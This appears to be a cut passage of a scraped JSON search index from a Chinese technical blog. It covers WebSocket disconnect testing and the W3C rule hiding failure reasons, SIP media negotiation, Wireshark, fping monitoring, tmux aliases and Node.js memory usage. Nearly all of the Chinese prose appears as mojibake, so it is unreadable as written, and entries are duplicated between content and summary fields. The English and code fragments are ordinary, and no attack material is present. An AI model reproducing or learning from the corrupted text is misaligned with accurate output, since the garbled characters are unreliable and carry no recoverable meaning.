https://man7.org/linux/man-pages/man2/getrlimit.2.html https://man7.org/linux/man-pages/man5/proc.5.html ","title":"ç”Ÿäº§ç¯å¢ƒnginxé…ç½®"},{"content":"è°ƒç ”ç›®çš„ åœ¨å¼‚å¸¸æƒ…å†µä¸‹ï¼Œç½‘ç»œæ–­å¼€å¯¹WebSocketçš„å½±å“ æµ‹è¯•ä»£ç  æµ‹è¯•ä»£ç æ²¡æœ‰å¿ƒè·³æœºåˆ¶ å¿ƒè·³æœºåˆ¶å¹¶ä¸åŒ…å«åœ¨WebSocketåè®®å†…éƒ¨ var ws = new WebSocket(\u0026#39;wss://echo.websocket.org/\u0026#39;) ws.onopen =function(e){ console.log(\u0026#39;onopen\u0026#39;) } ws.onerror = function (e) { console.log(\u0026#39;onerror: \u0026#39; + e.code) console.log(e) } ws.onclose = function (e) { console.log(\u0026#39;onclose: \u0026#39; + e.code) console.log(e) } åœºæ™¯1: æ–­ç½‘åï¼Œæ˜¯å¦ä¼šç«‹å³è§¦å‘onerror, æˆ–è€…oncloseäº‹ä»¶ï¼Ÿ ç­”æ¡ˆï¼šä¸ä¼šç«‹å³è§¦å‘\næµ‹è¯•ä»£ç ä¸­æ²¡æœ‰å¿ƒè·³æœºåˆ¶ï¼Œæ–­ç½‘åï¼Œå¹¶ä¸ä¼šç«‹å³è§¦å‘onerroræˆ–è€…oncloseçš„å›è°ƒå‡½æ•°ã€‚\nä¸ªäººæµ‹è¯•çš„æƒ…å†µ\nåŠå…¶ æµ‹è¯•åœºæ™¯ Macbook pro chrome 83.0.4103.106 æ¯éš”10ç§’å‘é€ä¸€æ¬¡æ¶ˆæ¯çš„æƒ…å†µä¸‹ï¼Œ40ç§’åå‡ºå‘oncloseäº‹ä»¶ Macbook proÂ chrome 83.0.4103.106 ä¸€ç›´ä¸å‘é€æ¶ˆæ¯ï¼Œä¸€ç›´å°±ä¸å›å‡ºå‘oncloseäº‹ä»¶ Macbook pro chrome 83.0.4103.106 å‘å‡ºä¸€ä¸ªæ¶ˆæ¯åï¼Ÿ åœºæ™¯2: æ–­ç½‘åï¼Œä½¿ç”¨send()å‘é€æ•°æ®ï¼Œå›è§¦å‘äº‹ä»¶å—ï¼Ÿ ä¸ºä»€ä¹ˆæ— æ³•å‡†ç¡®æ‹¿åˆ°æ–­å¼€åŸå› ï¼Ÿ WebSocketå…³é—­äº‹ä»¶ä¸­æœ‰ä¸‰ä¸ªå±æ€§\ncode æ–­å¼€åŸå› ç  reason å…·ä½“åŸå›  wasClean æ˜¯å¦æ˜¯æ­£å¸¸æ–­å¼€ å®˜æ–¹æ–‡æ¡£ä¸Šï¼Œcodeå­—æ®µæœ‰å¾ˆå¤šä¸ªå€¼ã€‚ä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¦ä¹ˆæ‹¿åˆ°çš„å€¼æ˜¯undefined, è¦ä¹ˆæ˜¯1006ï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰å…¶ä»–æƒ…å†µã€‚\nè¿™å¹¶ä¸æ˜¯æµè§ˆå™¨çš„bug, è¿™æ˜¯æµè§ˆå™¨æ•…æ„è¿™æ ·åšçš„ã€‚åœ¨w3cçš„å®˜æ–¹æ–‡æ¡£ä¸Šç»™å‡ºçš„åŸå› å…¶å®æ˜¯å¤„äºå®‰å…¨çš„è€ƒè™‘ã€‚\nè¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæŠŠæ–­å¼€åŸå› ç»™å‡ºçš„éå¸¸å…·ä½“ã€‚é‚£ä¹ˆä¸€ä¸ªæ¶æ„çš„jsè„šæœ¬å°±æœ‰å¯èƒ½åšç«¯å£æ‰«ææˆ–åˆ™æ¶æ„çš„æ³¨å…¥ã€‚\nUser agents must not convey any failure information to scripts in a way that would allow a script to distinguish the following situations:\nA server whose host name could not be resolved.\nA server to which packets could not successfully be routed.\nA server that refused the connection on the specified port.\nA server that failed to correctly perform a TLS handshake (e.g., the server certificate can\u0026rsquo;t be verified).\nA server that did not complete the opening handshake (e.g. because it was not a WebSocket server).\nA WebSocket server that sent a correct opening handshake, but that specified options that caused the client to drop the connection (e.g. the server specified a subprotocol that the client did not offer).\nA WebSocket server that abruptly closed the connection after successfully completing the opening handshake.\nIn all of these cases, the the WebSocket connection close code would be 1006, as required by the WebSocket Protocol specification. [WSP]\nAllowing a script to distinguish these cases would allow a script to probe the user\u0026rsquo;s local network in preparation for an attack. https://www.w3.org/TR/websockets/%23concept-websocket-close-fail\n","permalink":"https://wdd.js.org/posts/2020/06/sbhglg/","summary":"è°ƒç ”ç›®çš„ åœ¨å¼‚å¸¸æƒ…å†µä¸‹ï¼Œç½‘ç»œæ–­å¼€å¯¹WebSocketçš„å½±å“ æµ‹è¯•ä»£ç  æµ‹è¯•ä»£ç æ²¡æœ‰å¿ƒè·³æœºåˆ¶ å¿ƒè·³æœºåˆ¶å¹¶ä¸åŒ…å«åœ¨WebSocketåè®®å†…éƒ¨ var ws = new WebSocket(\u0026#39;wss://echo.websocket.org/\u0026#39;) ws.onopen =function(e){ console.log(\u0026#39;onopen\u0026#39;) } ws.onerror = function (e) { console.log(\u0026#39;onerror: \u0026#39; + e.code) console.log(e) } ws.onclose = function (e) { console.log(\u0026#39;onclose: \u0026#39; + e.code) console.log(e) } åœºæ™¯1: æ–­ç½‘åï¼Œæ˜¯å¦ä¼šç«‹å³è§¦å‘onerror, æˆ–è€…oncloseäº‹ä»¶ï¼Ÿ ç­”æ¡ˆï¼šä¸ä¼šç«‹å³è§¦å‘\næµ‹è¯•ä»£ç ä¸­æ²¡æœ‰å¿ƒè·³æœºåˆ¶ï¼Œæ–­ç½‘åï¼Œå¹¶ä¸ä¼šç«‹å³è§¦å‘onerroræˆ–è€…oncloseçš„å›è°ƒå‡½æ•°ã€‚\nä¸ªäººæµ‹è¯•çš„æƒ…å†µ\nåŠå…¶ æµ‹è¯•åœºæ™¯ Macbook pro chrome 83.0.4103.106 æ¯éš”10ç§’å‘é€ä¸€æ¬¡æ¶ˆæ¯çš„æƒ…å†µä¸‹ï¼Œ40ç§’åå‡ºå‘oncloseäº‹ä»¶ Macbook proÂ chrome 83.0.4103.106 ä¸€ç›´ä¸å‘é€æ¶ˆæ¯ï¼Œä¸€ç›´å°±ä¸å›å‡ºå‘oncloseäº‹ä»¶ Macbook pro chrome 83.0.4103.106 å‘å‡ºä¸€ä¸ªæ¶ˆæ¯åï¼Ÿ åœºæ™¯2: æ–­ç½‘åï¼Œä½¿ç”¨send()å‘é€æ•°æ®ï¼Œå›è§¦å‘äº‹ä»¶å—ï¼Ÿ ä¸ºä»€ä¹ˆæ— æ³•å‡†ç¡®æ‹¿åˆ°æ–­å¼€åŸå› ï¼Ÿ WebSocketå…³é—­äº‹ä»¶ä¸­æœ‰ä¸‰ä¸ªå±æ€§\ncode æ–­å¼€åŸå› ç  reason å…·ä½“åŸå›  wasClean æ˜¯å¦æ˜¯æ­£å¸¸æ–­å¼€ å®˜æ–¹æ–‡æ¡£ä¸Šï¼Œcodeå­—æ®µæœ‰å¾ˆå¤šä¸ªå€¼ã€‚ä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¦ä¹ˆæ‹¿åˆ°çš„å€¼æ˜¯undefined, è¦ä¹ˆæ˜¯1006ï¼ŒåŸºæœ¬ä¸Šæ²¡æœ‰å…¶ä»–æƒ…å†µã€‚","title":"[æœªå®Œæˆ] WebSocketè°ƒç ”"},{"content":"ä¸€èˆ¬çš„sipç½‘å…³åŒæ—¶å…·æœ‰ä¿¡ä»¤å’Œåª’ä½“å¤„ç†çš„èƒ½åŠ›ï¼Œå¦‚ä¸‹å›¾ã€‚\nä½†æ˜¯ä¹Ÿæœ‰ä¿¡ä»¤å’Œåª’ä½“åˆ†å¼€çš„ç½‘å…³ã€‚åœ¨å’Œç½‘å…³ä¿¡ä»¤äº¤äº’è¿‡ç¨‹ä¸­ï¼Œç½‘å…³ä¼šå°†åª’ä½“åœ°å€æ”¾åˆ°sdpä¸­ã€‚\néš¾ç‚¹å°±æ¥äº†ï¼Œåœ¨natå­˜åœ¨çš„åœºæ™¯ä¸‹ï¼Œä½ å¹¶ä¸çŸ¥é“sdpé‡Œçš„åª’ä½“åœ°å€æ˜¯å¦æ˜¯çœŸå®çš„åœ°å€ã€‚\né‚£ä¹ˆä½ å°±è¦é€‰æ‹©ï¼Œæ˜¯ç›¸ä¿¡sdpä¸­çš„åª’ä½“åœ°å€ï¼Œè¿˜æ˜¯æŠŠsipä¿¡ä»¤çš„æºipä½œä¸ºåª’ä½“åœ°å€å‘¢ï¼Ÿ\n","permalink":"https://wdd.js.org/opensips/ch1/sip-rtp-path/","summary":"ä¸€èˆ¬çš„sipç½‘å…³åŒæ—¶å…·æœ‰ä¿¡ä»¤å’Œåª’ä½“å¤„ç†çš„èƒ½åŠ›ï¼Œå¦‚ä¸‹å›¾ã€‚\nä½†æ˜¯ä¹Ÿæœ‰ä¿¡ä»¤å’Œåª’ä½“åˆ†å¼€çš„ç½‘å…³ã€‚åœ¨å’Œç½‘å…³ä¿¡ä»¤äº¤äº’è¿‡ç¨‹ä¸­ï¼Œç½‘å…³ä¼šå°†åª’ä½“åœ°å€æ”¾åˆ°sdpä¸­ã€‚\néš¾ç‚¹å°±æ¥äº†ï¼Œåœ¨natå­˜åœ¨çš„åœºæ™¯ä¸‹ï¼Œä½ å¹¶ä¸çŸ¥é“sdpé‡Œçš„åª’ä½“åœ°å€æ˜¯å¦æ˜¯çœŸå®çš„åœ°å€ã€‚\né‚£ä¹ˆä½ å°±è¦é€‰æ‹©ï¼Œæ˜¯ç›¸ä¿¡sdpä¸­çš„åª’ä½“åœ°å€ï¼Œè¿˜æ˜¯æŠŠsipä¿¡ä»¤çš„æºipä½œä¸ºåª’ä½“åœ°å€å‘¢ï¼Ÿ","title":"åª’ä½“è·¯å¾„ä¸ä¿¡ä»¤è·¯å¾„"},{"content":"1. ç®€ä»‹ åª’ä½“åå•†ç”¨æ¥äº¤æ¢å‘¼å«åŒæ–¹çš„åª’ä½“èƒ½åŠ›ã€‚å¦‚\næ”¯æŒçš„ç¼–ç ç±»å‹æœ‰å“ªäº› é‡‡æ ·é¢‘ç‡æ˜¯å¤šå°‘ åª’ä½“ç«¯å£ï¼Œip ä¿¡æ¯ \u0026hellip; åª’ä½“åå•†ä½¿ç”¨çš„æ˜¯è¯·æ±‚å’Œåº”ç­”æ¨¡å‹ã€‚å³ä¸€æ–¹å‘å¦ä¸€æ–¹å‘é€å«æœ‰ sdp ä¿¡æ¯çš„æ¶ˆæ¯ï¼Œç„¶åå¦ä¸€æ–¹æ›´å…·å¯¹æ–¹æä¾›çš„ç¼–ç ä»¥åŠè‡ªå·±æ”¯æŒçš„ç¼–ç ï¼Œå¦‚æœåå•†æˆåŠŸï¼Œåˆ™å°†åå•†åçš„æ¶ˆæ¯ sdp å†æ¬¡å‘é€ç»™å¯¹æ–¹ã€‚\n2. å¸¸è§çš„å‡ ä¸ªåå•†æ–¹å¼ 2.1 åœ¨ INVITE ä¸­ offer 2.2 åœ¨ 200 OK ä¸­ offer 2.3 åœ¨ UPDATE ä¸­ offer 2.4 åœ¨ PRACK ä¸­ offer 3. å¸¸è§çš„å‡ ä¸ªé—®é¢˜ ä¸€èˆ¬å‘¼å«åˆ°ä¸­ç»§æµ‹æ—¶ï¼Œä¸­ç»§å›çš„ 183 ä¿¡ä»¤æ˜¯ä¼šæºå¸¦ sdp ä¿¡æ¯çš„ ä¸€èˆ¬æ‰“åˆ°åˆ†æœºæ—¶ï¼Œåˆ†æœºå›çš„ 180 ä¿¡ä»¤æ˜¯æ²¡æœ‰ sdp ä¿¡æ¯çš„ ä¸è¦å…ˆå…¥ä¸ºä¸»çš„è®¤ä¸ºï¼ŒæŸäº›è¯·æ±‚ä¸€å®šå¸¦æœ‰ sdpï¼ŒæŸäº›è¯·æ±‚ä¸€å®šæ²¡æœ‰ sdpã€‚è€Œåº”å½“å»æµ‹è¯•è¯·æ±‚æˆ–è€…å“åº”æ¶ˆæ¯ä¸Šæœ‰æ²¡æœ‰æºå¸¦ sdp ä¿¡æ¯ã€‚\næºå¸¦ sdp ä¿¡æ¯çš„ sip æ¶ˆæ¯ä¼šå‡ºç°ä¸‹é¢çš„å¤´\nContent-Type: application/sdp ","permalink":"https://wdd.js.org/opensips/ch1/offer-answer/","summary":"1. ç®€ä»‹ åª’ä½“åå•†ç”¨æ¥äº¤æ¢å‘¼å«åŒæ–¹çš„åª’ä½“èƒ½åŠ›ã€‚å¦‚\næ”¯æŒçš„ç¼–ç ç±»å‹æœ‰å“ªäº› é‡‡æ ·é¢‘ç‡æ˜¯å¤šå°‘ åª’ä½“ç«¯å£ï¼Œip ä¿¡æ¯ \u0026hellip; åª’ä½“åå•†ä½¿ç”¨çš„æ˜¯è¯·æ±‚å’Œåº”ç­”æ¨¡å‹ã€‚å³ä¸€æ–¹å‘å¦ä¸€æ–¹å‘é€å«æœ‰ sdp ä¿¡æ¯çš„æ¶ˆæ¯ï¼Œç„¶åå¦ä¸€æ–¹æ›´å…·å¯¹æ–¹æä¾›çš„ç¼–ç ä»¥åŠè‡ªå·±æ”¯æŒçš„ç¼–ç ï¼Œå¦‚æœåå•†æˆåŠŸï¼Œåˆ™å°†åå•†åçš„æ¶ˆæ¯ sdp å†æ¬¡å‘é€ç»™å¯¹æ–¹ã€‚\n2. å¸¸è§çš„å‡ ä¸ªåå•†æ–¹å¼ 2.1 åœ¨ INVITE ä¸­ offer 2.2 åœ¨ 200 OK ä¸­ offer 2.3 åœ¨ UPDATE ä¸­ offer 2.4 åœ¨ PRACK ä¸­ offer 3. å¸¸è§çš„å‡ ä¸ªé—®é¢˜ ä¸€èˆ¬å‘¼å«åˆ°ä¸­ç»§æµ‹æ—¶ï¼Œä¸­ç»§å›çš„ 183 ä¿¡ä»¤æ˜¯ä¼šæºå¸¦ sdp ä¿¡æ¯çš„ ä¸€èˆ¬æ‰“åˆ°åˆ†æœºæ—¶ï¼Œåˆ†æœºå›çš„ 180 ä¿¡ä»¤æ˜¯æ²¡æœ‰ sdp ä¿¡æ¯çš„ ä¸è¦å…ˆå…¥ä¸ºä¸»çš„è®¤ä¸ºï¼ŒæŸäº›è¯·æ±‚ä¸€å®šå¸¦æœ‰ sdpï¼ŒæŸäº›è¯·æ±‚ä¸€å®šæ²¡æœ‰ sdpã€‚è€Œåº”å½“å»æµ‹è¯•è¯·æ±‚æˆ–è€…å“åº”æ¶ˆæ¯ä¸Šæœ‰æ²¡æœ‰æºå¸¦ sdp ä¿¡æ¯ã€‚\næºå¸¦ sdp ä¿¡æ¯çš„ sip æ¶ˆæ¯ä¼šå‡ºç°ä¸‹é¢çš„å¤´\nContent-Type: application/sdp ","title":"åª’ä½“åå•† offer/answeræ¨¡å‹"},{"content":"Decode As Udp wireshark æœ‰æ—¶å€™å¹¶ä¸èƒ½æŠŠudpåŒ…è¯†åˆ«ä¸ºrtpåŒ…ï¼Œæ‰€ä»¥è¿™è¾¹å¯èƒ½éœ€è¦æ‰‹åŠ¨è®¾ç½®è§£ç æ–¹å¼\n","permalink":"https://wdd.js.org/opensips/tools/wireshark-player-pcap/","summary":"Decode As Udp wireshark æœ‰æ—¶å€™å¹¶ä¸èƒ½æŠŠudpåŒ…è¯†åˆ«ä¸ºrtpåŒ…ï¼Œæ‰€ä»¥è¿™è¾¹å¯èƒ½éœ€è¦æ‰‹åŠ¨è®¾ç½®è§£ç æ–¹å¼","title":"wireshark æ’­æ”¾æŠ“åŒ…æ–‡ä»¶"},{"content":"æ–°å»ºä¸€ä¸ªæ–‡ä»¶ ip.list.cfg, åŒ…å«æ‰€æœ‰çš„å¸¦æµ‹è¯•çš„ipåœ°å€ã€‚\n192.168.40.20 192.168.40.21 æ‰§è¡Œå‘½ä»¤:\nnohup fping -D -u -l -p 2000 -f ip.list.cfg \u0026amp; -D æ˜¾ç¤ºæ—¶é—´æˆ³ -u æ˜¾ç¤ºä¸å¯è¾¾çš„ç›®æ ‡ -l æŒç»­çš„ping -p æ¯éš”å¤šå°‘æ¯«ç§’æ‰§è¡Œä¸€æ¬¡ -f æŒ‡å®šipåˆ—è¡¨æ–‡ä»¶ åœ¨nohup.outä¸­ï¼Œå›æŒç»­çš„æ˜¾ç¤ºåˆ°å„ä¸ªipçš„ç½‘ç»œçŠ¶å†µã€‚\n[1592643928.961414] 192.168.40.20 : [0], 84 bytes, 3.22 ms (3.22 avg, 0% loss) [1592643928.969987] 192.168.40.21 : [0], 84 bytes, 1.22 ms (1.22 avg, 0% loss) [1592643930.965753] 192.168.40.20 : [1], 84 bytes, 5.25 ms (4.23 avg, 0% loss) [1592643930.972833] 192.168.40.21 : [1], 84 bytes, 1.14 ms (1.18 avg, 0% loss) [1592643932.965636] 192.168.40.20 : [2], 84 bytes, 3.45 ms (3.97 avg, 0% loss) [1592643932.978245] 192.168.40.21 : [2], 84 bytes, 4.39 ms (2.25 avg, 0% loss) [1592643934.991354] 192.168.40.20 : [3], 84 bytes, 27.9 ms (9.96 avg, 0% loss) [1592643934.991621] 192.168.40.21 : [3], 84 bytes, 14.9 ms (5.42 avg, 0% loss) [1592643936.978135] 192.168.40.20 : [4], 84 bytes, 11.3 ms (10.2 avg, 0% loss) [1592643936.979620] 192.168.40.21 : [4], 84 bytes, 1.37 ms (4.61 avg, 0% loss) ","permalink":"https://wdd.js.org/posts/2020/06/qtdzvr/","summary":"æ–°å»ºä¸€ä¸ªæ–‡ä»¶ ip.list.cfg, åŒ…å«æ‰€æœ‰çš„å¸¦æµ‹è¯•çš„ipåœ°å€ã€‚\n192.168.40.20 192.168.40.21 æ‰§è¡Œå‘½ä»¤:\nnohup fping -D -u -l -p 2000 -f ip.list.cfg \u0026amp; -D æ˜¾ç¤ºæ—¶é—´æˆ³ -u æ˜¾ç¤ºä¸å¯è¾¾çš„ç›®æ ‡ -l æŒç»­çš„ping -p æ¯éš”å¤šå°‘æ¯«ç§’æ‰§è¡Œä¸€æ¬¡ -f æŒ‡å®šipåˆ—è¡¨æ–‡ä»¶ åœ¨nohup.outä¸­ï¼Œå›æŒç»­çš„æ˜¾ç¤ºåˆ°å„ä¸ªipçš„ç½‘ç»œçŠ¶å†µã€‚\n[1592643928.961414] 192.168.40.20 : [0], 84 bytes, 3.22 ms (3.22 avg, 0% loss) [1592643928.969987] 192.168.40.21 : [0], 84 bytes, 1.22 ms (1.22 avg, 0% loss) [1592643930.965753] 192.168.40.20 : [1], 84 bytes, 5.25 ms (4.23 avg, 0% loss) [1592643930.972833] 192.168.40.21 : [1], 84 bytes, 1.14 ms (1.","title":"fping ç½‘ç»œçŠ¶æ€ç›‘æ§æµ‹è¯•"},{"content":".zshrcé…ç½® vim ~/.zshrc plugins=(git tmux) # åŠ å…¥tmux, ç„¶åä¿å­˜é€€å‡º source ~/.zshrc tmux å¿«æ·é”® Alias Command Description ta tmux attach -t Attach new tmux session to already running named session tad tmux attach -d -t Detach named tmux session ts tmux new-session -s Create a new named tmux session tl tmux list-sessions Displays a list of running tmux sessions tksv tmux kill-server Terminate all running tmux sessions tkss tmux kill-session -t Terminate named running tmux session tmux _zsh_tmux_plugin_run Start a new tmux session ","permalink":"https://wdd.js.org/posts/2020/06/rh9zsc/","summary":".zshrcé…ç½® vim ~/.zshrc plugins=(git tmux) # åŠ å…¥tmux, ç„¶åä¿å­˜é€€å‡º source ~/.zshrc tmux å¿«æ·é”® Alias Command Description ta tmux attach -t Attach new tmux session to already running named session tad tmux attach -d -t Detach named tmux session ts tmux new-session -s Create a new named tmux session tl tmux list-sessions Displays a list of running tmux sessions tksv tmux kill-server Terminate all running tmux sessions tkss tmux kill-session -t Terminate named running tmux session tmux _zsh_tmux_plugin_run Start a new tmux session ","title":"oh-my-zsh å®‰è£… tmuxæ’ä»¶"},{"content":"GCé‡Šæ”¾æ—¶æœº å½“HeapUsedæ¥è¿‘æœ€å¤§å †å†…å­˜æ—¶ï¼Œå‡ºå‘GCé‡Šæ”¾ã€‚ ä¸‹å›¾æ˜¯æ·±å¤œï¼Œå‹åŠ›æ¯”è¾ƒå°çš„æ—¶å€™ã€‚ ä¸‹å›¾æ˜¯ä¸Šåˆå·¥ä½œæ—¶é—´\nå†…å­˜æ³„æ¼ OOM ","permalink":"https://wdd.js.org/fe/nodejs-gc-times/","summary":"GCé‡Šæ”¾æ—¶æœº å½“HeapUsedæ¥è¿‘æœ€å¤§å †å†…å­˜æ—¶ï¼Œå‡ºå‘GCé‡Šæ”¾ã€‚ ä¸‹å›¾æ˜¯æ·±å¤œï¼Œå‹åŠ›æ¯”è¾ƒå°çš„æ—¶å€™ã€‚ ä¸‹å›¾æ˜¯ä¸Šåˆå·¥ä½œæ—¶é—´\nå†…å­˜æ³„æ¼ OOM ","title":"Nodejs Gc Times"},{"content":"","permalink":"https://wdd.js.org/posts/2020/06/elg2v2/","summary":"","title":"Nodejsè¯Šæ–­æŠ¥å‘Š"},{"content":"process.memoryUsage() { rss: 4935680, heapTotal: 1826816, heapUsed: 650472, external: 49879, arrayBuffers: 9386 } heapTotal å’Œ heapUsedæŒ‡å‘V8\u0026rsquo;s å†…å­˜ä½¿ç”¨ external æŒ‡å‘ C++ å¯¹è±¡çš„å†…å­˜ä½¿ç”¨ï¼Œ C++å¯¹è±¡ç»‘å®šjså¯¹è±¡ï¼Œå¹¶ä¸”ç”±V8ç®¡ç† rss, å®é™…å ç”¨å†…å­˜ï¼ŒåŒ…æ‹¬C++, jså¯¹è±¡å’Œä»£ç ä¸‰å—çš„æ€»è®¡ã€‚ä½¿ç”¨ ps auxå‘½ä»¤è¾“å‡ºæ—¶ï¼Œrssçš„å€¼å¯¹åº”äº†RSSåˆ—çš„æ•°å€¼ node js æ‰€æœ‰bufferå ç”¨çš„å†…å­˜ heapTotal and heapUsed refer to V8\u0026rsquo;s memory usage. external refers to the memory usage of C++ objects bound to JavaScript objects managed by V8. rss, Resident Set Size, is the amount of space occupied in the main memory device (that is a subset of the total allocated memory) for the process, including all C++ and JavaScript objects and code. arrayBuffers refers to memory allocated for ArrayBuffers and SharedArrayBuffers, including all Node.js Buffers. This is also included in the external value. When Node.js is used as an embedded library, this value may be 0 because allocations for ArrayBuffers may not be tracked in that case. process.resourceUsage() userCPUTime maps to ru_utime computed in microseconds. It is the same value as process.cpuUsage().user. systemCPUTime maps to ru_stime computed in microseconds. It is the same value as process.cpuUsage().system. maxRSS maps to ru_maxrss which is the maximum resident set size used in kilobytes. sharedMemorySize maps to ru_ixrss but is not supported by any platform. unsharedDataSize maps to ru_idrss but is not supported by any platform. unsharedStackSize maps to ru_isrss but is not supported by any platform. minorPageFault maps to ru_minflt which is the number of minor page faults for the process, see this article for more details. majorPageFault maps to ru_majflt which is the number of major page faults for the process, see this article for more details. This field is not supported on Windows. swappedOut maps to ru_nswap but is not supported by any platform. fsRead maps to ru_inblock which is the number of times the file system had to perform input. fsWrite maps to ru_oublock which is the number of times the file system had to perform output. ipcSent maps to ru_msgsnd but is not supported by any platform. ipcReceived maps to ru_msgrcv but is not supported by any platform. signalsCount maps to ru_nsignals but is not supported by any platform. voluntaryContextSwitches maps to ru_nvcsw which is the number of times a CPU context switch resulted due to a process voluntarily giving up the processor before its time slice was completed (usually to await availability of a resource). This field is not supported on Windows. involuntaryContextSwitches maps to ru_nivcsw which is the number of times a CPU context switch resulted due to a higher priority process becoming runnable or because the current process exceeded its time slice. This field is not supported on Windows. console.log(process.resourceUsage()); /* Will output: { userCPUTime: 82872, systemCPUTime: 4143, maxRSS: 33164, sharedMemorySize: 0, unsharedDataSize: 0, unsharedStackSize: 0, minorPageFault: 2469, majorPageFault: 0, swappedOut: 0, fsRead: 0, fsWrite: 8, ipcSent: 0, ipcReceived: 0, signalsCount: 0, voluntaryContextSwitches: 79, involuntaryContextSwitches: 1 } */ ","permalink":"https://wdd.js.org/fe/nodejs-mem-usage/","summary":"process.memoryUsage() { rss: 4935680, heapTotal: 1826816, heapUsed: 650472, external: 49879, arrayBuffers: 9386 } heapTotal å’Œ heapUsedæŒ‡å‘V8\u0026rsquo;s å†…å­˜ä½¿ç”¨ external æŒ‡å‘ C++ å¯¹è±¡çš„å†…å­˜ä½¿ç”¨ï¼Œ C++å¯¹è±¡ç»‘å®šjså¯¹è±¡ï¼Œå¹¶ä¸”ç”±V8ç®¡ç† rss, å®é™…å ç”¨å†…å­˜ï¼ŒåŒ…æ‹¬C++, jså¯¹è±¡å’Œä»£ç ä¸‰å—çš„æ€»è®¡ã€‚ä½¿ç”¨ ps auxå‘½ä»¤è¾“å‡ºæ—¶ï¼Œrssçš„å€¼å¯¹åº”äº†RSSåˆ—çš„æ•°å€¼ node js æ‰€æœ‰bufferå ç”¨çš„å†…å­˜ heapTotal and heapUsed refer to V8\u0026rsquo;s memory usage. external refers to the memory usage of C++ objects bound to JavaScript objects managed by V8. rss, Resident Set Size, is the amount of space occupied in the main memory device (that is a subset of the total allocated memory) for the process, including all C++ and JavaScript objects and code.","title":"Nodejs Mem Usage"},{"content":"v8å†…å­˜æ¨¡å‹ Code Segment: ä»£ç è¢«å®é™…æ‰§è¡Œ Stack æœ¬åœ°å˜é‡ æŒ‡å‘å¼•ç”¨çš„å˜é‡ æµç¨‹æ§åˆ¶ï¼Œä¾‹å¦‚å‡½æ•° Heap V8è´Ÿè´£ç®¡ç† HeapTotal å †çš„æ€»å¤§å° HeapUsed å®é™…ä½¿ç”¨çš„å¤§å° Shallow size of an object: å¯¹è±¡è‡ªèº«å ç”¨çš„å†…å­˜ Retained size of an object: å¯¹è±¡åŠå…¶ä¾èµ–å¯¹è±¡åˆ é™¤åå›é‡Šæ”¾çš„å†…å­˜ ","permalink":"https://wdd.js.org/fe/nodejs-memory-model/","summary":"v8å†…å­˜æ¨¡å‹ Code Segment: ä»£ç è¢«å®é™…æ‰§è¡Œ Stack æœ¬åœ°å˜é‡ æŒ‡å‘å¼•ç”¨çš„å˜é‡ æµç¨‹æ§åˆ¶ï¼Œä¾‹å¦‚å‡½æ•° Heap V8è´Ÿè´£ç®¡ç† HeapTotal å †çš„æ€»å¤§å° HeapUsed å®é™…ä½¿ç”¨çš„å¤§å° Shallow size of an object: å¯¹è±¡è‡ªèº«å ç”¨çš„å†…å­˜ Retained size of an object: å¯¹è±¡åŠå…¶ä¾èµ–å¯¹è±¡åˆ é™¤åå›é‡Šæ”¾çš„å†…å­˜ ","title":"Nodejs Memory Model"},{"content":"ä»å„ç§å±‚æ¬¡æ’æŸ¥äº†é—®é¢˜ï¼ŒåŒ…æ‹¬\ndockerç‰ˆæœ¬ä¸ä¸€æ · è„šæœ¬ä¸ä¸€æ · é•œåƒçš„é—®é¢˜ \u0026hellip; ä»å„ç§è§’åº¦æ’æŸ¥è¿‡åï¼Œå´å‘ç°ï¼Œé—®é¢˜åœ¨æ˜¯æ‹¼å†™é”™è¯¯ã€‚ç¯å¢ƒå˜é‡æ²¡æœ‰è®¾ç½®å¯¹ï¼Œå¯¼è‡´è¿›ç¨‹æ— æ³•å‰å°è¿è¡Œã€‚\nèƒ½ä¸æ‹¼å†™å°±ä¸è¦æ‹¼å†™ï¼ï¼ç›´æ¥å¤åˆ¶ã€‚\nå¤§æ–‡ä»¶åœ¨ä¼ è¾“å›¾ä¸­å¯èƒ½ä¼šæ–‡ä»¶æŸåï¼Œæœ€å¥½ä½¿ç”¨md5sumè®¡ç®—æ–‡ä»¶æ ¡éªŒå’Œï¼Œç„¶ååšå¯¹æ¯”ã€‚\n","permalink":"https://wdd.js.org/posts/2020/06/ghpbm9/","summary":"ä»å„ç§å±‚æ¬¡æ’æŸ¥äº†é—®é¢˜ï¼ŒåŒ…æ‹¬\ndockerç‰ˆæœ¬ä¸ä¸€æ · è„šæœ¬ä¸ä¸€æ · é•œåƒçš„é—®é¢˜ \u0026hellip; ä»å„ç§è§’åº¦æ’æŸ¥è¿‡åï¼Œå´å‘ç°ï¼Œé—®é¢˜åœ¨æ˜¯æ‹¼å†™é”™è¯¯ã€‚ç¯å¢ƒå˜é‡æ²¡æœ‰è®¾ç½®å¯¹ï¼Œå¯¼è‡´è¿›ç¨‹æ— æ³•å‰å°è¿è¡Œã€‚\nèƒ½ä¸æ‹¼å†™å°±ä¸è¦æ‹¼å†™ï¼ï¼ç›´æ¥å¤åˆ¶ã€‚\nå¤§æ–‡ä»¶åœ¨ä¼ è¾“å›¾ä¸­å¯èƒ½ä¼šæ–‡ä»¶æŸåï¼Œæœ€å¥½ä½¿ç”¨md5sumè®¡ç®—æ–‡ä»¶æ ¡éªŒå’Œï¼Œç„¶ååšå¯¹æ¯”ã€‚","title":"è§£å†³é—®é¢˜çš„æœ€åä¸€ä¸ªæ€è·¯ï¼šæ‹¼å†™é”™è¯¯ï¼ï¼"},{"content":" webrtcçš„å„ç§demo https://webrtc.github.io/samples/ åœ¨çº¿éŸ³é¢‘å¤„ç† https://audiomass.co/ å€¼å¾—æ·±å…¥é˜…è¯»ï¼Œå…³äºå¦‚ä½•demoçš„æ€è€ƒ https://kitsonkelly.com/posts/deno-is-a-browser-for-code/ ä¸é”™çš„ä»‹ç»demoçš„åšå®¢ https://kitsonkelly.com/posts jså¦‚ä½•è·å–éŸ³é¢‘è§†é¢‘ https://www.webdevdrops.com/en/how-to-access-device-cameras-with-javascript/ batså¯ä»¥ç”¨æ¥æµ‹è¯•shellè„šæœ¬ https://github.com/bats-core/bats-core æ‰‹ç»˜é£æ ¼çš„æµç¨‹å›¾ https://excalidraw.com/ ","permalink":"https://wdd.js.org/posts/2020/06/gbm9n6/","summary":" webrtcçš„å„ç§demo https://webrtc.github.io/samples/ åœ¨çº¿éŸ³é¢‘å¤„ç† https://audiomass.co/ 